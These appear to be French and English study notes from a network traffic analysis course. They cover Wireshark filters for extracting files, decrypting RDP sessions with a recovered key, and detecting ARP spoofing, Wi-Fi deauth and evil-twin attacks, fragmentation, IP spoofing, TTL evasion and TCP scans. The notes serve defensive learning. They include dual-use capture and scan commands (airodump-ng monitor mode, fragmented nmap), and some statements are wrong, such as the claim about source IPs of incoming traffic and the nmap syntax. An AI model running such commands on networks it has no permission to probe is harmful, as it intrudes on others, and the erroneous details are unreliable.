| Filtre                | Fonction                                              |
| --------------------- | ----------------------------------------------------- |
| `ftp`                 | Affiche tout le trafic FTP (port 21)                  |
| `ftp.request.command` | Affiche les commandes FTP (USER, PASS, RETR, STOR...) |
| `ftp-data`            | Montre les transferts de fichiers sur le port 20      |

---

### 📥 **Reconstruction d’un fichier FTP depuis un .pcap :**

1. **Filtrer le trafic FTP :**

   ```bash
   ftp
   ```

2. **Identifier les commandes :**

   ```bash
   ftp.request.command
   ```

   Permet de repérer les noms de fichiers et les tentatives de login.

3. **Trouver les données transférées :**

   ```bash
   ftp-data
   ```

4. **Suivre le flux TCP du fichier souhaité :**

   * Clic droit > Follow > TCP Stream
   * Choisir **Raw** comme affichage
   * **Enregistrer le contenu** avec le nom de fichier original

5. **Vérifier le type du fichier** (par exemple avec `file` sous Linux) pour s'assurer qu’il a été correctement reconstruit.

---

Ce processus permet de **réaliser des analyses forensiques précises**, d’extraire des fichiers transmis sur le réseau et d’identifier des activités suspectes ou malveillantes.

```

## **Packet Inception, Dissecting Network Traffic With Wireshark**

```jsx

---

## 🧪 **Objectifs du Lab : Analyse de trafic HTTP avec Wireshark**

Ce laboratoire vous guide étape par étape pour analyser le trafic HTTP, identifier des transferts de fichiers (notamment des images JPEG), et extraire des fichiers à partir d’une capture réseau.

---

### ✅ **Tâche 1 : Ouvrir un fichier PCAP**

**But :** Charger un fichier `.pcap` pré-capturé pour analyser le trafic HTTP.

**Étapes :**

1. Ouvrir **Wireshark**.
2. Aller dans **Fichier → Ouvrir** (`File → Open`).
3. Sélectionner **Wireshark-lab-2.pcap**.
4. Le fichier s’ouvre et affiche l’ensemble du trafic réseau capturé.

---

### ✅ **Tâche 2 : Filtrer le trafic HTTP**

**But :** Se concentrer uniquement sur les communications HTTP (port 80), en particulier les **requêtes GET** et les **réponses 200 OK** (indiquant un transfert réussi de fichiers).

**Étapes :**

1. Dans la barre de filtres, taper :

   ```
   http
   ```
2. Vérifier que la barre devient **verte** (syntaxe correcte).
3. Parcourir les paquets :

   * Rechercher les lignes contenant **GET**.
   * Identifier les réponses **HTTP/1.1 200 OK**.

---

### ✅ **Tâche 3 : Suivre un flux TCP**

**But :** Examiner une session HTTP complète associée à un transfert de fichier.

**Étapes :**

1. Cliquer sur un paquet **HTTP 200 OK**.
2. Clic droit → **Follow → TCP Stream**.
3. Une nouvelle fenêtre affiche la **conversation complète**.
4. Confirmer que le **fichier a bien été transféré** dans ce flux.

---

### ✅ **Tâche 4 : Rechercher des images JFIF**

**But :** Identifier les fichiers image JPEG (format JFIF) transférés via HTTP.

**Étapes :**

1. Effacer tout filtre actif.
2. Taper le filtre suivant :

   ```
   http && image-jfif
   ```
3. Ce filtre isole uniquement les paquets contenant des **images JPEG intégrées**, facilitant leur détection.

---

### ✅ **Tâche 5 : Extraire les images du trafic**

**But :** Exporter les fichiers image détectés afin de les analyser ou de les transmettre à l’équipe de sécurité.

**Étapes :**

1. Aller dans le menu **File → Export Objects → HTTP**.
2. Parcourir la liste et repérer les fichiers JPEG (ex. : `file.JPG`).
3. Cliquer sur **Save As** pour enregistrer localement le fichier image.

---

### 🔍 **Conseil de sécurité :**

Les images extraites peuvent contenir des **données cachées** (stéganographie) ou avoir été exfiltrées illégalement. Il est essentiel de les examiner avec soin selon les instructions du responsable sécurité.

```

## **Decrypting RDP Connections**

```jsx

---

## 🧪 **Laboratoire : Analyse de sessions RDP chiffrées avec Wireshark**

Ce laboratoire montre comment identifier, déchiffrer et analyser le trafic RDP contenu dans un fichier `.pcapng` à l’aide de **Wireshark**, en utilisant une **clé privée RSA** pour accéder aux données sensibles comme le nom d'utilisateur.

---

### ✅ **Tâche 1 : Ouvrir un fichier PCAP RDP**

**But :** Charger la capture RDP à analyser.

**Étapes :**

1. Extraire le fichier **RDP-analysis.zip**.
2. Ouvrir **Wireshark**.
3. Sélectionner **Fichier → Ouvrir** (`File → Open`) et choisir **rdp.pcapng**.

---

### ✅ **Tâche 2 : Analyse initiale du trafic RDP**

**But :** Identifier le trafic RDP dans la capture, généralement sur le port TCP 3389.

**Commandes de filtre :**

* Pour voir uniquement le trafic RDP :

  ```
  rdp
  ```
* Pour filtrer par port :

  ```
  tcp.port == 3389
  ```

---

### ✅ **Tâche 3 : Ajouter la clé de déchiffrement dans Wireshark**

**But :** Déchiffrer le trafic RDP avec une clé RSA privée récupérée depuis l’hôte de Bob.

**Étapes :**

1. Aller dans **Édition → Préférences → Protocoles → TLS**.
2. Sous "RSA Keys List", cliquer sur **Éditer** puis **Ajouter** une nouvelle entrée :

   * **Adresse IP :** `10.129.43.29`
   * **Port :** `3389`
   * **Protocole :** `tpkt` (ou laisser vide si nécessaire)
   * **Fichier de clé :** Sélectionner le fichier **server.key**
3. Enregistrer les changements.
4. **Rafraîchir** le fichier `.pcapng` dans Wireshark.

---

### ✅ **Tâche 4 : Analyse du trafic RDP déchiffré**

**But :** Observer les données maintenant lisibles et examiner le contenu des sessions RDP.

**Filtre recommandé :**

```
rdp
```

**Astuce :** Vous pouvez aussi suivre les **flux TCP** pour voir l’échange complet entre client et serveur.

---

### 🕵️ **Questions d’analyse**

* **Adresse IP de l'hôte initiateur :**
  Chercher le **premier paquet** de la **poignée de main TCP (SYN)**.
  **Réponse :** `10.129.43.27`

* **Nom d'utilisateur utilisé dans la session RDP :**
  Dans le trafic déchiffré (filtré avec `tcp.port == 3389`), chercher dans les paquets marqués **"Ignored Unknown Record"**. Le **contenu ASCII** peut afficher le **nom d'utilisateur**.

---

### 📌 **Résumé et enseignement**

Grâce à la **clé privée RSA**, **Wireshark** permet de **déchiffrer** des protocoles habituellement sécurisés comme RDP. Cela est crucial en **analyse forensique** et en **réponse à incident**, car :

* Le contenu des sessions RDP peut être examiné.
* Des données sensibles comme les **identifiants de connexion** peuvent être récupérées.
* Cela renforce l’importance de **protéger les clés privées** et de **restreindre les accès RDP**.

```

## Intermediate Network Traffic Analysis Overview

## **ARP Spoofing & Abnormality Detection**

```jsx

---

## 🧾 **Vue d’ensemble**

* Le **protocole ARP (Address Resolution Protocol)** est souvent la cible d’attaques comme :

  * **Man-in-the-Middle (MITM)**
  * **Déni de service (DoS)**
* Ces attaques sont détectables car elles s'appuient sur des **diffusions réseau (broadcast)**, capturables via un **sniffer de paquets**.

---

## ⚙️ **Fonctionnement du protocole ARP**

* Les hôtes utilisent ARP pour connaître l’adresse MAC associée à une IP sur le réseau local.

**Étapes du processus ARP :**

1. **L’hôte A** vérifie son cache ARP.
2. Si l’IP n’est pas trouvée, il diffuse une **requête ARP (ARP Request)**.
3. **L’hôte B** répond avec une **réponse ARP (ARP Reply)** contenant son adresse IP et MAC.
4. Le cache ARP de A est mis à jour avec la nouvelle correspondance IP-MAC.

---

## 🧨 **Empoisonnement / Usurpation ARP (ARP Poisoning & Spoofing)**

* **ARP Cache Poisoning** : L’attaquant envoie de fausses trames ARP pour tromper les caches ARP.

### 🎯 Étapes de l’attaque :

1. L’attaquant envoie des **ARP Replies falsifiées** à la victime **et** au routeur.
2. Les deux mettent à jour leur cache avec la **fausse adresse MAC de l’attaquant**.
3. L’attaquant devient un relais, **intercepte** le trafic et peut **le modifier** (attaque MITM).

---

## 🕵️ **Détection & Prévention**

### 🔍 **Détection :**

* Surveiller les modèles inhabituels de trafic ARP (ex. : requêtes répétées).
* Repérer des **incohérences IP-MAC** dans les réponses ARP.

### 🛡️ **Prévention :**

* **Entrées ARP statiques** : empêchent la mise à jour automatique (mais difficiles à gérer).
* **Sécurité des ports sur les switches** : limite les MAC autorisées sur un port réseau.

---

## 🧪 **Détection pratique avec tcpdump et Wireshark**

### 📥 **Installation de tcpdump :**

```bash
sudo apt install tcpdump -y
```

### 📦 **Capture du trafic ARP :**

```bash
sudo tcpdump -i eth0 -w capture_arp.pcapng
```

### 📈 **Analyse dans Wireshark :**

```bash
wireshark capture_arp.pcapng
```

#### 📌 Filtres Wireshark utiles :

| But                    | Filtre                                              |
| ---------------------- | --------------------------------------------------- |
| Requêtes ARP           | `arp.opcode == 1`                                   |
| Réponses ARP           | `arp.opcode == 2`                                   |
| Duplications d’adresse | `arp.duplicate-address-detected && arp.opcode == 2` |

---

## 🔎 **Examiner les anomalies IP/MAC**

Utilisez `arp -a` sur Linux pour inspecter la table ARP :

```bash
arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
```

Dans **Wireshark**, filtrez les adresses MAC suspectes :

```bash
eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba
```

---

```

## **ARP Scanning & Denial-of-Service**

```jsx

---

## 🔍 **Signes d’activités anormales dans le trafic ARP**

En plus des attaques de type **poisoning** et **spoofing**, des acteurs malveillants peuvent aussi exploiter ARP pour effectuer du **renseignement réseau**.

### ⚠️ **Indicateurs d’un scan ARP :**

* **Requêtes ARP broadcast** envoyées à des **adresses IP séquentielles** (ex. : .1, .2, .3, …).
* Requêtes ARP envoyées vers **des hôtes inexistants**.
* **Volume anormal de trafic ARP** provenant d’un seul hôte (potentiellement compromis ou malveillant).

---

## 🧪 **Détection d’un scan ARP**

En ouvrant le fichier `ARP_Scan.pcapng` dans **Wireshark** et en appliquant le filtre suivant :

```wireshark
arp.opcode
```

On peut observer :

* Un hôte envoyant des requêtes ARP vers **toutes les IP d’un sous-réseau**, ce qui suggère un **scan ARP actif** (souvent initié par des outils comme **Nmap**).
* Les **réponses ARP** des hôtes actifs permettent à l’attaquant de **cartographier les équipements en ligne**.

---

## 🚫 **Identification d’un déni de service (DoS) via ARP**

### 🧨 Étapes d’une attaque ARP DoS :

1. L’attaquant **scanne les hôtes actifs**.
2. Il tente de **corrompre les caches ARP** du réseau :

   * En attribuant des **nouvelles adresses MAC** à chaque IP légitime.
   * En attribuant **une même IP (ex. : 192.168.10.1)** à plusieurs machines (conflits d’IP), perturbant la communication.

### 🎯 Objectif :

Plonger le sous-réseau dans le **chaos ARP**, entraînant :

* Perturbation des connexions.
* Possibilité d’interception (MITM).
* Saturation du cache ARP des équipements (DoS).

---

## 🛡️ **Réaction face aux attaques ARP**

### 🔍 **Traçage et identification** :

* Remonter à la **machine physique** qui émet les paquets ARP suspects.
* Il est possible qu’elle soit **elle-même infectée** ou utilisée comme relais.

### 🧯 **Confinement** :

* **Déconnecter** ou **isoler** le segment réseau affecté via le **switch ou le routeur**.
* Cela permet de **stopper la propagation**, bloquer la fuite de données ou mettre fin à l’attaque DoS/MITM.

---

## 📝 **Remarque Importante**

> Les attaques au **niveau de la couche liaison (couche 2 OSI)** peuvent sembler anodines au départ, mais leur détection précoce est **cruciale pour éviter des exfiltrations à des couches supérieures**.

---

```

## **802.11 Denial of Service**

```jsx
### 802.11 (Wi-Fi) Traffic Analysis: Detecting Attacks

In traffic analysis, it's essential to focus on **link-layer protocols** like **802.11 (Wi-Fi)**. Many network defenders overlook Wi-Fi traffic attacks, which can lead to significant vulnerabilities, especially if human error compromises perimeter security.

### Capturing 802.11 Traffic

To analyze raw 802.11 traffic, a **wireless interface in monitor mode** is required. This mode allows you to capture unencrypted frames without the need for an active association with an access point (AP). It’s similar to promiscuous mode but specifically designed for Wi-Fi.

#### Steps to Capture Traffic:

1. **Enumerate Wireless Interfaces**:
   In **Linux**, use `iwconfig` to list wireless interfaces.

   ```bash
   iwconfig
   ```

2. **Enable Monitor Mode**:
   There are multiple ways to enable monitor mode. Here are two methods:

   * **Option 1**: Using `airmon-ng`:

     ```bash
     sudo airmon-ng start wlan0
     ```

   * **Option 2**: Using system utilities:

     ```bash
     sudo ifconfig wlan0 down
     sudo iwconfig wlan0 mode monitor
     sudo ifconfig wlan0 up
     ```

3. **Verify Monitor Mode**:
   After enabling monitor mode, verify it with `iwconfig`:

   ```bash
   iwconfig
   ```

4. **Capture Traffic Using airodump-ng**:
   To capture Wi-Fi traffic, specify the AP’s channel and BSSID, and output the results to a file using `airodump-ng`:

   ```bash
   sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
   ```

---

### How Deauthentication Attacks Work

**Deauthentication and dissociation attacks** are common types of **link-layer attacks** that attackers use for a variety of purposes:

* **Capturing WPA handshakes**
* **Disrupting service**
* **Forcing clients to connect to rogue or malicious networks**

In these attacks, the attacker **spoofs** deauthentication frames from the legitimate **Access Point (AP)**, tricking connected clients into disconnecting. This forces the client to re-authenticate, allowing the attacker to intercept the WPA handshake.

**Tools commonly used for deauthentication attacks** include:

* **aireplay-ng**
* **mdk4**

Often, the **reason code 7** (from the 802.11 standard) is used for deauthentication in these attacks.

---

### Detecting Deauthentication Attacks

When monitoring traffic, you can look for **deauthentication frames** sent from the AP's BSSID. In Wireshark, use the following steps to detect deauthentication attacks:

1. **Filter for the AP’s BSSID**:
   This isolates the frames sent by the targeted AP.

   ```bash
   wlan.bssid == xx:xx:xx:xx:xx:xx
   ```

2. **Filter for Deauthentication Frames**:
   Deauthentication frames are identified by the frame type and subtype. The subtype value for deauthentication is **12**.

   ```bash
   (wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
   ```

3. **Look for Reason Code 7**:
   Reason code 7 is commonly used for deauthentication attacks. If a large number of deauthentication frames are seen with this reason code, it’s likely an attack.

   ```bash
   (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
   ```

#### Revolving Reason Codes:

Sophisticated attackers may rotate the reason codes to avoid detection. To detect this, you can create filters for different reason codes. For example:

* **Reason Code 1**:

  ```bash
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)
  ```

* **Reason Code 2**:

  ```bash
  (wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)
  ```

This allows you to capture attacks that don’t always use reason code 7.

---

### Compensating Measures

To prevent **deauthentication attacks** and other **link-layer attacks**, consider the following defensive strategies:

* **Enable IEEE 802.11w**: This standard provides **Management Frame Protection (MFP)**, which helps secure management frames like deauthentication and disassociation frames.
* **Use WPA3-SAE**: WPA3 offers better protection against offline dictionary attacks and improves security over WPA2.
* **Update WIDS/WIPS**: Wireless Intrusion Detection and Prevention Systems (WIDS/WIPS) can help detect and mitigate such attacks. Ensure your detection rules are up-to-date.

---

### Detecting Failed Authentication Attempts

**Excessive association requests** may indicate an attack, as attackers will often try to associate with the network to capture the WPA handshake. To capture these requests in Wireshark, filter for association-related frames:

```bash
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```

This filter helps identify **failed authentication attempts** or repeated association requests, which can be signs of a dictionary or brute force attack.

---

### Conclusion

Monitoring **802.11 traffic** for signs of **deauthentication attacks**, **failed authentications**, and other suspicious activity is crucial in maintaining Wi-Fi security. By utilizing tools like Wireshark and airodump-ng, and applying the correct filters, you can detect these attacks early and take appropriate actions to protect the network. Additionally, enabling robust security protocols like **WPA3** and **802.11w** will significantly reduce the likelihood of such attacks succeeding.

```

## **Rogue Access Point & Evil-Twin Attacks**

```jsx
### Point d'Accès Rogue (Rogue AP)

Un **point d'accès rogue** est un appareil non autorisé connecté directement au réseau, ce qui permet de contourner les contrôles périphériques. Ces points d'accès peuvent :

* Contourner la segmentation du réseau.
* Fournir un accès non autorisé à des sections restreintes du réseau.
* Parfois infiltrer des réseaux isolés (air-gapped).

#### Evil-Twin

Un **point d'accès Evil-Twin** est généralement un point d'accès autonome, séparé du réseau légitime, utilisé par les attaquants pour intercepter des données via des attaques de type **Man-in-the-Middle (MITM)**. Ces points d'accès :

* Sont souvent configurés pour capturer des informations sensibles, telles que des identifiants sans fil.
* Peuvent héberger des portails malveillants pour inciter les utilisateurs à divulguer leurs informations de connexion.

#### Détection avec Airodump-ng

Nous pouvons utiliser **airodump-ng** avec un filtre ESSID pour détecter les points d'accès Evil-Twin :

```bash
sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
```

Exemple de sortie :

```
CH  4 ][ Elapsed: 1 min ][ 2023-07-13 16:06    
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
F8:14:FE:4D:E6:F2   -7 100      470      155    0   4   54   OPN              HTB-Wireless
F8:14:FE:4D:E6:F1   -5  96      682        0    0   4  324   WPA2 CCMP   PSK  HTB-Wireless 
```

Cet exemple montre un AP malveillant ouvert avec un ESSID identique à notre AP légitime, suggérant une attaque de type **hostile portal**.

#### Analyse des Beacons pour la Détection d'Evil-Twin

Pour confirmer des anomalies, examinez les trames de beacon avec ce filtre Wireshark :

```bash
(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
```

##### Analyse des Beacons :

* **Information RSN** : L'AP légitime peut contenir des informations RSN indiquant WPA2 avec AES/TKIP et PSK. En revanche, un AP malveillant pourrait ne pas avoir ces informations RSN.
* **Champs supplémentaires** : Pour des attaques sophistiquées, vérifiez les informations spécifiques au vendeur et d'autres identifiants uniques qui pourraient manquer dans l'AP de l'attaquant.

#### Identification des Utilisateurs Compromis

Dans le cas d'attaques Evil-Twin sur un réseau ouvert :

1. Utilisez le filtre Wireshark suivant pour isoler le trafic provenant de l'AP suspect :

```bash
(wlan.bssid == F8:14:FE:4D:E6:F2)
```

2. La détection des requêtes **ARP** provenant d'un appareil client sur ce réseau pourrait indiquer un compromis potentiel. Notez :

* L'adresse MAC de l'appareil client.
* Le nom d'hôte.

Prenez des mesures réactives comme des réinitialisations de mots de passe pour atténuer le risque.

#### Détection des Points d'Accès Rogue

La détection des points d'accès rogue passe souvent par la surveillance des dispositifs réseau. Il faut chercher :

* Des réseaux non reconnus avec des signaux forts, en particulier des réseaux ouverts.
* Des points d'accès suspects à proximité (par exemple, des **hotspots Windows**).

Les réseaux inconnus sans cryptage peuvent indiquer des points d'accès rogue mis en place pour contourner la sécurité du réseau.

```

## **Fragmentation Attacks**

```jsx
### L'Analyse des Trafic Réseau au Niveau de la Couche IP et l'Abus de la Fragmentation

Lors de l'analyse du trafic réseau, la **couche IP** est cruciale pour comprendre le transfert de paquets entre hôtes. Cependant, cette couche ne dispose pas de mécanismes pour détecter les paquets perdus ou altérés, ces problèmes étant gérés par les couches **transport** et **application**. Voici les champs clés de l'en-tête IP :

* **Longueur** : La longueur de l'en-tête IP.
* **Longueur Totale** : La longueur totale du paquet IP, y compris les données.
* **Décalage de Fragmentation** : Ce champ est défini lorsque les paquets sont fragmentés, il aide à la réassemblée au niveau du destinataire.
* **Adresses IP Source et Destination** : Identifie les hôtes d'origine et de destination.

### L'Abus des Champs de Fragmentation

Les attaquants peuvent manipuler ces champs pour contourner les contrôles réseau. Comprendre l'abus de ces champs peut améliorer la détection lors de l'analyse du trafic.

#### Techniques d'Abus de la Fragmentation

Les hôtes légitimes fragmentent les paquets pour transférer de grands ensembles de données, suivant la norme **Maximum Transmission Unit (MTU)**. Les attaquants exploitent la fragmentation pour :

1. **Évasion des systèmes de détection d'intrusion (IDS) / systèmes de prévention des intrusions (IPS)** : Si l'IDS ne réassemble pas les fragments, les attaquants peuvent utiliser des scans fragmentés (par exemple, avec `nmap`) pour contourner la détection.
2. **Évasion des Pare-feux** : Les paquets fragmentés peuvent contourner les contrôles du pare-feu s'ils ne sont pas réassemblés avant la livraison.
3. **Épuisement des ressources des pare-feux/IPS/IDS** : Des tailles MTU petites (par exemple, 10, 15 octets) sollicitent les ressources et peuvent contourner la réassemblée en raison de limites de ressources.
4. **Déni de service (DoS)** : Des hôtes anciens peuvent être submergés par des paquets fragmentés volumineux, provoquant une attaque par déni de service.

Un mécanisme réseau correctement configuré devrait utiliser **la réassemblée différée**, c'est-à-dire attendre tous les fragments avant d'effectuer l'inspection des paquets.

### Détection des Anomalies de Décalage de Fragmentation

Pour inspecter les anomalies de fragmentation, ouvrez le fichier de capture dans Wireshark :

```bash
wireshark nmap_frag_fw_bypass.pcapng
```

#### Indicateurs de Scans Fragmentés

* **Requêtes ICMP** : Les scans `nmap` ou similaires commencent souvent par des requêtes ICMP pour la découverte d'hôtes.

  ```bash
  nmap <adresse_ip_hôte>
  ```

* **Paquets Fragmentés avec MTU Spécifié** : Les attaquants définissent un MTU spécifique pour fragmenter les paquets.

  ```bash
  nmap -f 10 <adresse_ip_hôte>
  ```

  Les paquets avec une fragmentation répétée d'un hôte peuvent indiquer une attaque par fragmentation.

* **Un Hôte, Plusieurs Ports** : Les scans fragmentés génèrent des réponses avec des **flags RST** pour les ports fermés, ce qui indique des scans sur plusieurs ports.

#### Configuration de Wireshark pour la Réassemblée

Si Wireshark ne réassemble pas les paquets automatiquement, vous devez ajuster les paramètres sous **Préférences** pour le protocole **IPv4** afin d'assurer la réassemblée des paquets, facilitant ainsi une inspection plus précise.

---

### Conclusion

L'usage malveillant de la fragmentation, comme dans les attaques par **fragmentation de scans** ou **l'évasion des pare-feu**, peut être détecté efficacement avec les bons outils et paramètres. En ajustant correctement **Wireshark** pour réassembler les paquets, il devient possible de repérer les anomalies de fragmentation et de mieux protéger le réseau contre ces formes d'attaque.

```

## **IP Source & Destination Spoofing Attacks**

```jsx
### Manipulation des Champs IP dans le Trafic IPv4 et IPv6

Lors de l'analyse du trafic réseau, il est crucial d'examiner les champs **source IP** et **destination IP**, car leur manipulation peut être un indicateur clé d'attaques. Voici les éléments à prendre en compte lors de l’analyse du trafic réseau :

#### Source IP pour le Trafic Entrant

* La **source IP** du trafic entrant doit toujours appartenir à notre sous-réseau. Une **IP externe** dans ce contexte pourrait indiquer une tentative de manipulation de paquets, comme le **spoofing**.

#### Source IP pour le Trafic Sortant

* La **source IP** du trafic sortant devrait aussi être interne à notre sous-réseau. Une plage d'IP inhabituelle peut suggérer du trafic malveillant provenant de l'intérieur du réseau, éventuellement d'un **hôte compromis**.

### Méthodes d'Attaque Impliquant le Spoofing IP

Les attaquants peuvent manipuler les champs IP source et destination pour diverses raisons :

#### 1. **Scanning avec Appât**

* Les attaquants modifient l'adresse IP source pour se faire passer pour un hôte du réseau cible afin d'éviter les restrictions du pare-feu et contourner les contrôles de sécurité.

#### 2. **Attaque de Source Aléatoire (DDoS)**

* Les attaquants envoient un grand volume de trafic depuis des **IP source aléatoires** dans le but d'épuiser les ressources du serveur cible (attaque par **déni de service distribué**).

#### 3. **Attaque LAND**

* L'attaquant modifie l'IP source pour qu'elle corresponde à l'IP de destination, provoquant l'épuisement des ressources ou un **plantage** de l'hôte cible.

#### 4. **Attaque SMURF**

* Envoie des paquets ICMP à plusieurs hôtes, avec l'IP de la victime comme adresse source, ce qui inonde la victime de réponses.

#### 5. **Génération de Vecteurs d'Initialisation**

* Dans les réseaux WEP plus anciens, des paquets avec des IP malveillantes peuvent être injectés pour aider à la construction de **tables de décryptage** utilisées dans des attaques statistiques.

Ces attaques reposent principalement sur la manipulation des champs IP au niveau de la couche IP, plutôt que sur l'empoisonnement ARP. Toutefois, ces deux méthodes peuvent être combinées dans des attaques sophistiquées.

### Détection des Tentatives de Scan avec Appât

Un attaquant peut modifier son IP source pour imiter un hôte légitime, avec pour objectif de contourner les contrôles IDS/pare-feu. Les signes d'un **scan avec appât** incluent :

* **Fragmentation initiale** en provenance d'une adresse spoofée.
* Trafic **TCP** provenant d'une adresse source légitime, avec des **flags RST** pour les ports fermés.

#### Techniques de Détection :

1. **Reconstruction des Paquets** : Assurez-vous que les systèmes IDS/IPS/pare-feu peuvent reconstituer les paquets et analyser le comportement du trafic de la machine de destination.
2. **Consistance des Connexions** : Surveillez les connexions initiées par une machine et terminées par une autre, ce qui peut être un indicateur de **cachage d'adresse**.

### Détection des Attaques de Source Aléatoire

Les attaques de **source aléatoire** sont souvent utilisées dans les attaques par déni de service, où un grand nombre de **sources aléatoires** sont utilisées pour cibler un service particulier. Les indicateurs incluent :

* Utilisation d'**un seul port** par plusieurs hôtes aléatoires.
* **Ports de base incrémentiels** : les ports de base sont constants avec peu de variation.
* **Longueur uniforme des paquets** : Contrairement au trafic légitime des utilisateurs, les paquets créés peuvent avoir une longueur uniforme.

### Détection des Attaques SMURF

Les attaques **SMURF** exploitent les paquets ICMP en envoyant des demandes ICMP à plusieurs hôtes avec l'IP de la victime comme adresse source. Cela fait en sorte que chaque hôte réponde à la victime, la noyant sous une masse de réponses.

#### Étapes de l'Attaque SMURF :

1. Envoi de **requêtes ICMP** à des hôtes actifs avec l'IP de la victime comme source.
2. Réponses ICMP envoyées par les hôtes vers la victime, la saturant de trafic.

#### Détection :

* **Réponses ICMP excessives** à une seule cible.
* Des paquets ICMP fragmentés ou dotés de données supplémentaires peuvent être utilisés pour **amplifier le volume de l'attaque**.

### Détection des Attaques LAND

Les attaques **LAND** consistent à falsifier l'IP source pour qu'elle corresponde à l'IP de destination. Cette attaque crée une surcharge en envoyant un trafic élevé à un hôte cible, ce qui empêche l'établissement de connexions légitimes.

#### Symptomatiques de l'Attaque LAND :

* Une **congestion du réseau** et des ressources sur l'hôte cible à cause de la tentative de connexions incessantes à partir de la même adresse IP.

### Conclusion

Les attaques fondées sur la manipulation des champs IP, telles que le **spoofing** et les attaques DDoS utilisant des IP sources aléatoires, représentent des risques considérables pour la sécurité des réseaux. Une détection efficace de ces attaques repose sur l'analyse minutieuse des modèles de trafic et la capacité à reconstituer les paquets. La vigilance continue au niveau des systèmes IDS/IPS, des pare-feu et des mesures de sécurité réseau est essentielle pour identifier ces menaces et les contrer de manière proactive.

```

## **IP Time-to-Live Attacks**

```jsx
### Manipulation du Time-to-Live (TTL) dans les Attaques

Les attaques utilisant la manipulation du **Time-to-Live** (TTL) sont une technique d’évasion utilisée par les attaquants pour contourner les systèmes de détection tels que les **pare-feu**, **IDS** et **IPS**. Voici le fonctionnement de la manipulation de TTL :

#### Manipulation du TTL

1. **Création de Paquets avec un TTL Bas** : L'attaquant configure le TTL à une valeur basse (par exemple, 1, 2, 3).
2. **Décrémentation du TTL** : À chaque **saut** (hop) sur le réseau, le TTL est réduit de 1.
3. **Rejet des Paquets** : Lorsque le TTL atteint zéro, le paquet est rejeté, avant d'atteindre idéalement un pare-feu ou un filtre.
4. **Réponse ICMP** : Les paquets expirés déclenchent des messages **ICMP Time Exceeded** envoyés par les routeurs sur le chemin vers l'origine du paquet.

#### Détection des Anomalies de TTL

Pour détecter la manipulation du TTL, il est essentiel de capturer et d’analyser le trafic à l’aide de **Wireshark**. Bien qu'une instance isolée soit difficile à repérer, les attaquants utilisent souvent la manipulation du TTL lors de **scans de ports**, générant des motifs détectables.

##### Indicateurs de Manipulation de TTL

* **SYN, ACK provenant de Ports de Service** : Une réponse **SYN, ACK** légitime provenant d'un port de service peut indiquer qu'un pare-feu a été contourné.
* **Valeurs TTL Basses** : Lors de l'examen du champ **TTL** dans l’onglet IPv4 de Wireshark, des valeurs de TTL **anormalement basses** peuvent indiquer des paquets manipulés.

#### Stratégie de Mitigation

Une stratégie de mitigation consiste à mettre en place un contrôle qui filtre ou rejette les paquets ayant un TTL en dessous d'un certain seuil. Cela permet de prévenir les attaques par manipulation du TTL qui exploitent les paquets **IP craftés** pour contourner les défenses réseau.

```

## **TCP Handshake Abnormalities**

```jsx
### Probing TCP Services: Understanding Anomalous Behavior

When attackers probe TCP services, they often exploit various scanning techniques that deviate from standard traffic patterns. These behaviors can reveal malicious intent and indicate attempts to identify vulnerable services. To understand these anomalies, we first need to review how a standard **TCP 3-way handshake** works.

---

### TCP Handshake Overview

1. **SYN Request**: The client sends a SYN packet to initiate the connection to the target port.
2. **SYN-ACK Response**: If the target port is open, the server responds with a SYN-ACK, acknowledging the request and indicating that the port is open.
3. **ACK Completion**: The client responds with an ACK to complete the handshake and establish the connection.

### Common TCP Flags and Their Functions

* **URG (Urgent)**: Indicates that the data should be processed immediately.
* **ACK (Acknowledgment)**: Acknowledges that data has been received.
* **PSH (Push)**: Pushes data to the application layer immediately.
* **RST (Reset)**: Terminates the connection, often used in attack scenarios.
* **SYN (Synchronize)**: Initiates the connection during the handshake.
* **FIN (Finish)**: Ends the connection.
* **ECN (Explicit Congestion Notification)**: Notifies the sender of network congestion.

These flags are essential in tracking the state of TCP connections and can help identify unusual or malicious activity.

---

### Indicators of Abnormal TCP Handshake Patterns

When attackers probe services, certain abnormal behaviors can be observed during the TCP handshake or communication. These anomalies often serve as indicators of malicious activity:

* **Excessive Flags**: If multiple flags are used in one packet, or if the same flag appears repeatedly, this may indicate a scanning attempt.
* **Unusual Flag Combinations**: Combinations of flags that are not typically used together can suggest attempts to exploit vulnerabilities (e.g., RST flag usage in attempts to terminate or hijack connections).
* **Single Host Targeting Multiple Ports or Hosts**: Scans from a single host that target multiple ports or hosts are common in network reconnaissance. These could be decoy scans, or the attacker could be trying random source IPs to evade detection.

---

### Types of TCP Scans

#### 1. **SYN Scan (Half-Open Scan)**

* **Technique**: The attacker sends a SYN packet to a target port. If the port is open, the server responds with a SYN-ACK. The attacker then sends an RST to close the connection without completing the handshake.

* **Response**:

  * **Open Port**: SYN-ACK response from the server.
  * **Closed Port**: RST response from the server.

* **Detection**: This scan technique is stealthy because the attacker does not complete the handshake, leaving less trace in the target system's logs.

#### 2. **SYN Stealth Scan**

* **Technique**: Similar to SYN Scan, but the attacker only partially completes the handshake (e.g., only sends a SYN and never sends an ACK). This helps avoid detection by intrusion detection systems (IDS) and firewalls.

* **Response**:

  * **Open Port**: SYN-ACK response.
  * **Closed Port**: No response or an RST.

* **Detection**: This scan is particularly difficult to detect because it never fully establishes a connection.

#### 3. **NULL Scan**

* **Technique**: The attacker sends TCP packets with **no flags** set, which can confuse the target system.

* **Response**:

